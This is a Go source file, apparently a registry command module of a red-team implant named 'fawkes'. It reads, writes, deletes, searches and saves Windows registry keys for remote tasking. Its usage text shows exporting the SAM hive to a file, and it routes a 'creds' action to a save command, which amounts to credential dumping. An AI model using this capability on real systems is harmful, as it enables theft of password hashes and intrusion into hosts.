//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

// RegCommand is a unified registry command that dispatches to read, write,
// delete, search, and save actions. This provides a single entry point
// while the individual reg-read, reg-write, etc. commands remain as aliases.
type RegCommand struct{}

func (c *RegCommand) Name() string { return "reg" }
func (c *RegCommand) Description() string {
	return "Unified Windows Registry operations — read, write, delete, search, save"
}

// regArgs is the superset of all registry action parameters.
type regArgs struct {
	Action     string `json:"action"`
	Hive       string `json:"hive"`
	Path       string `json:"path"`
	Name       string `json:"name"`
	Data       string `json:"data"`
	RegType    string `json:"reg_type"`
	Recursive  string `json:"recursive"`
	Pattern    string `json:"pattern"`
	MaxDepth   int    `json:"max_depth"`
	MaxResults int    `json:"max_results"`
	Output     string `json:"output"`
}

func (c *RegCommand) Execute(task structs.Task) structs.CommandResult {
	var args regArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error parsing parameters: %v\nUsage: reg -action <read|write|delete|search|save> ...", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	if args.Action == "" {
		return structs.CommandResult{
			Output: "Usage: reg -action <read|write|delete|search|save> [options]\n\n" +
				"Actions:\n" +
				"  read    — Read registry values (reg -action read -hive HKLM -path SOFTWARE\\...)\n" +
				"  write   — Write registry values (reg -action write -hive HKCU -path ... -name Val -data hello -type REG_SZ)\n" +
				"  delete  — Delete keys/values (reg -action delete -hive HKCU -path ... [-name Val] [-recursive true])\n" +
				"  search  — Search registry recursively (reg -action search -pattern term [-hive HKLM] [-path SOFTWARE])\n" +
				"  save    — Export hives to files (reg -action save -hive HKLM -path SAM -output C:\\Temp\\sam.hiv)\n",
			Status:    "success",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "read":
		return regActionRead(args)
	case "write":
		return regActionWrite(args)
	case "delete":
		return regActionDelete(task, args)
	case "search":
		return regActionSearch(args)
	case "save", "creds":
		// Forward to the RegSaveCommand which handles both save and creds
		saveTask := task
		saveArgs := map[string]string{
			"action": args.Action,
			"hive":   args.Hive,
			"path":   args.Path,
			"output": args.Output,
		}
		data, _ := json.Marshal(saveArgs)
		saveTask.Params = string(data)
		return (&RegSaveCommand{}).Execute(saveTask)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use read, write, delete, search, save)", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func regActionRead(args regArgs) structs.CommandResult {
	if args.Path == "" {
		return structs.CommandResult{
			Output:    "Error: -path is required for read action",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Hive == "" {
		args.Hive = "HKLM"
	}

	hiveKey, err := parseHive(args.Hive)
	if err != nil {
		return structs.CommandResult{
			Output:    err.Error(),
			Status:    "error",
			Completed: true,
		}
	}

	key, err := registry.OpenKey(hiveKey, args.Path, registry.READ)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error opening key %s\\%s: %v", args.Hive, args.Path, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer key.Close()

	if args.Name != "" {
		output, err := readValue(key, args.Name)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error reading value '%s': %v", args.Name, err),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    output,
			Status:    "completed",
			Completed: true,
		}
	}

	output, err := enumerateValues(key, args.Hive, args.Path)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error enumerating values: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

func regActionWrite(args regArgs) structs.CommandResult {
	if args.Path == "" {
		return structs.CommandResult{
			Output:    "Error: -path is required for write action",
			Status:    "error",
			Completed: true,
		}
	}
	if args.RegType == "" {
		args.RegType = "REG_SZ"
	}
	if args.Hive == "" {
		args.Hive = "HKCU"
	}

	hiveKey, err := parseHive(args.Hive)
	if err != nil {
		return structs.CommandResult{
			Output:    err.Error(),
			Status:    "error",
			Completed: true,
		}
	}

	key, _, err := registry.CreateKey(hiveKey, args.Path, registry.SET_VALUE)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error opening/creating key %s\\%s: %v", args.Hive, args.Path, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer key.Close()

	if err := parseRegWriteValue(key, args.Name, args.Data, args.RegType); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing value: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	displayName := args.Name
	if displayName == "" {
		displayName = "(Default)"
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully wrote %s\\%s\\%s = %s [%s]", args.Hive, args.Path, displayName, args.Data, args.RegType),
		Status:    "completed",
		Completed: true,
	}
}

func regActionDelete(task structs.Task, args regArgs) structs.CommandResult {
	// Forward to existing RegDeleteCommand
	deleteArgs := map[string]string{
		"hive":      args.Hive,
		"path":      args.Path,
		"name":      args.Name,
		"recursive": args.Recursive,
	}
	data, _ := json.Marshal(deleteArgs)
	deleteTask := task
	deleteTask.Params = string(data)
	return (&RegDeleteCommand{}).Execute(deleteTask)
}

func regActionSearch(args regArgs) structs.CommandResult {
	if args.Pattern == "" {
		return structs.CommandResult{
			Output:    "Error: -pattern is required for search action",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Hive == "" {
		args.Hive = "HKLM"
	}
	if args.Path == "" {
		args.Path = "SOFTWARE"
	}
	if args.MaxDepth <= 0 {
		args.MaxDepth = 5
	}
	if args.MaxResults <= 0 {
		args.MaxResults = 50
	}

	hiveKey, err := parseHive(args.Hive)
	if err != nil {
		return structs.CommandResult{
			Output:    err.Error(),
			Status:    "error",
			Completed: true,
		}
	}

	var results []regSearchResult
	regSearchRecursive(hiveKey, args.Path, strings.ToLower(args.Pattern), 0, args.MaxDepth, args.MaxResults, &results)

	if len(results) == 0 {
		return structs.CommandResult{
			Output:    "[]",
			Status:    "success",
			Completed: true,
		}
	}

	data, err := json.Marshal(results)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error marshaling results: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    string(data),
		Status:    "success",
		Completed: true,
	}
}
